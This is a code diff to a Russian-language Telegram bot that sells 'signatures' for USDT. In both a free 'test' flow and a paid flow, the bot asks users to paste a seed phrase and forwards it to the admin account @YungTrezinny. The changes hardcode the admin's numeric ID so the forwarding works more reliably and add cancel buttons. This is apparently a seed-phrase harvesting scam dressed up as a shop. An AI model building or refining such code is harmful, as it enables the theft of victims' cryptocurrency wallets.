@@ -24,8 +24,8 @@ TOKEN = os.getenv("BOT_TOKEN")
 CHANNEL_ID = os.getenv("CHANNEL_ID")
 CHANNEL_URL = os.getenv("CHANNEL_URL", f"https://t.me/{CHANNEL_ID.replace('@', '')}")
 CP_TOKEN = os.getenv("CP_TOKEN")
-ADMIN_USERNAME = "@YungTrezinny"  # Админ для получения данных
-ADMIN_ID = None  # Будет получен при первом обращении
+ADMIN_USERNAME = "@YungTrezinny"  # Для отображения
+ADMIN_ID = 8268837047  # ЗАМЕНИ НА РЕАЛЬНЫЙ ЧИСЛОВОЙ ID АДМИНА!!! Получить можно через @userinfobot
 
 # Запасной курс USDT/RUB (1$ = 90₽ примерно)
 DEFAULT_USDT_RATE = 90.0
@@ -389,7 +389,7 @@ async def catalog(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("🧪 Тестовый товар (бесплатно)", callback_data="test_sim")],
         [InlineKeyboardButton("📱 Купить подписи", callback_data="buy_sim_menu")],
-        [InlineKeyboardButton("◀️ Назад", callback_data="back_to_menu")]
+        [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -414,7 +414,7 @@ async def buy_sim_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("3 подписи - 12$", callback_data="buy_sim_3")],
         [InlineKeyboardButton("4 подписи - 16$", callback_data="buy_sim_4")],
         [InlineKeyboardButton("5 подписей - 20$", callback_data="buy_sim_5")],
-        [InlineKeyboardButton("◀️ Назад", callback_data="catalog")]
+        [InlineKeyboardButton("◀️ Назад в каталог", callback_data="catalog")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -545,10 +545,14 @@ async def test_sim(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "user_id": user_id
     }
     
+    keyboard = [[InlineKeyboardButton("❌ Отмена", callback_data="cancel_input")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
     await query.edit_message_text(
         f"🧪 ТЕСТОВЫЙ РЕЖИМ\n\n"
         f"Отправьте сид-фразу для тестовой сим-карты.\n\n"
-        f"Она будет отправлена администратору @YungTrezinny для проверки."
+        f"Она будет отправлена администратору @YungTrezinny для проверки.",
+        reply_markup=reply_markup
     )
     
     return WAITING_FOR_SIM_SEED
@@ -580,13 +584,21 @@ async def handle_sim_seed(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📅 Дата: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"
     )
     
-    # Пытаемся получить ID админа по username
+    # Пытаемся отправить админу по числовому ID
     try:
-        # Отправляем админу
-        await context.bot.send_message(
-            chat_id=ADMIN_USERNAME,
-            text=admin_message
-        )
+        if ADMIN_ID and ADMIN_ID != 123456789:  # Проверяем что ID заменён
+            await context.bot.send_message(
+                chat_id=ADMIN_ID,
+                text=admin_message
+            )
+            logger.info(f"Сообщение отправлено админу {ADMIN_ID}")
+        else:
+            # Если ID не заменён, пробуем через юзернейм (может не работать)
+            await context.bot.send_message(
+                chat_id=ADMIN_USERNAME,
+                text=admin_message
+            )
+            logger.warning("Отправка через юзернейм, возможны проблемы")
         
         # Подтверждаем пользователю
         await update.message.reply_text(
@@ -605,11 +617,15 @@ async def handle_sim_seed(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         logger.error(f"Ошибка отправки админу: {e}")
         await update.message.reply_text(
-            f"❌ Ошибка при отправке данных. Попробуйте позже или напишите @YungTrezinny вручную."
+            f"❌ Ошибка при отправке данных. Попробуйте позже или напишите @YungTrezinny вручную.\n\n"
+            f"Ваша сид-фраза:\n{seed_text}"
         )
     
     # Очищаем данные
     context.user_data.pop("current_order", None)
+    
+    # Возвращаем в главное меню
+    await show_main_menu(update, context)
     
     return ConversationHandler.END
 
@@ -617,10 +633,18 @@ async def handle_sim_seed(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ОТМЕНА ВВОДА
 # ============================================
 async def cancel_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "❌ Ввод отменён. Возвращайтесь в меню через /start"
-    )
+    """Обработчик отмены ввода"""
+    query = update.callback_query
+    if query:
+        await query.answer()
+        context.user_data.pop("current_order", None)
+        await show_main_menu(update, context)
+        return ConversationHandler.END
+    
+    # Если это не callback, а просто команда
+    await update.message.reply_text("❌ Ввод отменён.")
     context.user_data.pop("current_order", None)
+    await show_main_menu(update, context)
     return ConversationHandler.END
 
 # ============================================
@@ -721,11 +745,15 @@ async def check_payment_callback(update: Update, context: ContextTypes.DEFAULT_T
             "user_id": user_id
         }
         
+        keyboard = [[InlineKeyboardButton("❌ Отмена", callback_data="cancel_input")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
         await query.edit_message_text(
             f"✅ Платёж подтверждён!\n\n"
             f"Теперь отправьте сид-фразу(ы) для сим-карт.\n\n"
             f"Если покупаете несколько штук, отправляйте каждую с новой строки.\n\n"
-            f"Все данные будут переданы администратору @YungTrezinny."
+            f"Все данные будут переданы администратору @YungTrezinny.",
+            reply_markup=reply_markup
         )
         
         # Удаляем информацию о платеже
@@ -766,7 +794,7 @@ async def orders_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
             text += f"Статус: {status}\n"
             text += f"Дата: {order.get('date', '')[:16]}\n\n"
     
-    keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data="back_to_menu")]]
+    keyboard = [[InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await query.edit_message_text(text, reply_markup=reply_markup)
 
@@ -777,7 +805,7 @@ async def about(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
-    keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data="back_to_menu")]]
+    keyboard = [[InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await query.edit_message_text(
         "ℹ️ О НАС\n\n"
@@ -797,7 +825,7 @@ async def contacts(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
-    keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data="back_to_menu")]]
+    keyboard = [[InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await query.edit_message_text(
         "📞 КОНТАКТЫ\n\n"
@@ -822,7 +850,7 @@ async def donate(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("25 USDT", callback_data="donate_25")],
         [InlineKeyboardButton("50 USDT", callback_data="donate_50")],
         [InlineKeyboardButton("100 USDT", callback_data="donate_100")],
-        [InlineKeyboardButton("◀️ Назад", callback_data="back_to_menu")]
+        [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -938,7 +966,8 @@ def main():
         ],
         states={
             WAITING_FOR_SIM_SEED: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_sim_seed)
+                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_sim_seed),
+                CallbackQueryHandler(cancel_input, pattern="^cancel_input$")
             ]
         },
         fallbacks=[CommandHandler("cancel", cancel_input)]
